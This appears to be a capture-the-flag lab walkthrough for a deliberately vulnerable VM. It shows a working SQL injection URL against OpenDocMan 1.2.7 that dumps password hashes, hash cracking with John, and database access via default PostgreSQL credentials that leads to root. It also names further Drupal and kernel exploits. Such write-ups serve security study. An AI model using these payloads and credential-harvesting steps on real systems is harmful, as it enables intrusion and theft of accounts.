```
192.168.56.104
```
## Methods
1. **Enumeration/Information Gathering:** I visited port 80 and clicked the link on the homepage which redirected me to /jabc/ directory. The documentation page appeared to be empty but upon selecting the entire page (ctrl+A) revealed a **hidden** message which told us the existence of another directory called **/jabcd0cs/** with a valid login credentials guest/guest.
2. **Web Exploitation:** The directory was using a service called **OpenDocMan v1.2.7**. The version is vulnerable to [CVE-2014-2317](https://www.exploit-db.com/exploits/32075). This vulnerability allowed the attacker to execute arbitrary SQL command. I used this to leak other user credentials in **odm_user** table using [Union Attack](../Methodology/SQL%20Injection.md) and found two pairs of username (webmin & guest) and hashed password. I wasn't able to crack user webmin password using [crackstation](https://crackstation.net/) so I used [John](../Tools%20&%20Theories/John.md) with `--single` as parameter and it returned **webmin1980**. The webmin credentials were then used to ssh to the machine. 
<pre style="font-size: 12px";>
/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user+UNION+SELECT+1,password,3,4,5,6,7,8,9+from+odm_user
echo webmin:b78aae356709f8c31118ea613980954b > webmin.hash
john --single --format=raw-md5 webmin.hash
ssh webmin@192.168.56.104 <font color=gray># webmin1980</font>
</pre>
3. **Privilege Escalation:** Using `netstat` I found that the localhost is listening on port 3306 and 5432 which corresponded to MySQL and PostgreSQL respectively. I found MySQL credentials at `/var/www/html/jabcd0cs/config.php`, checked the contents of it but nothing seemed useful. Progressing to PostgreSQL, I was able to got into the database with default credentials and found the password to another real user **vulnosadmin** with the password **c4nuh4ckm3tw1c3**.  The user home directory only have one visible file called **r00t.blend**. It's a blender file when opened showed a text hidden within a cube. The text was **ab12fg//drg** which was the root password.
<pre style="font-size: 12px";>
netstat -antup
cd /var/www/html/
grep -r connect\(
grep -r DB_USER
cat jabcd0cs/config.php <font color=gray># found valid mysql credentials</font>
psql -h localhost -U postgres <font color=gray># with password 'postgres'</font>
\list
\connect system
\dt
select * from users; <font color=gray># found vulnosadmin pasword</font>
\quit
su vulnosadmin <font color=gray># c4nuh4ckm3tw1c3</font>
su root <font color=gray># ab12fg//drg</font>
cd /root
cat flag.txt
</pre>

Alternatives:
1.  **Web Exploitation:** Checking /jabc/?q=node/7#overlay=%3Fq%3Dadmin%252Freports%252Fstatus, it's said that the website was running `drupal 7.26` which was vulnerable to [CVE-2018-7600](https://www.exploit-db.com/exploits/44449).
2. **Privilege Escalation:** The kernel version and distro was vulnerable to [CVE-2015-1328](https://www.exploit-db.com/exploits/37292).

Default state.
![](../Assets/images/Pasted%20image%2020220815204725.png)

After hiding the cube layer.
![](../Assets/images/Pasted%20image%2020220815204659.png)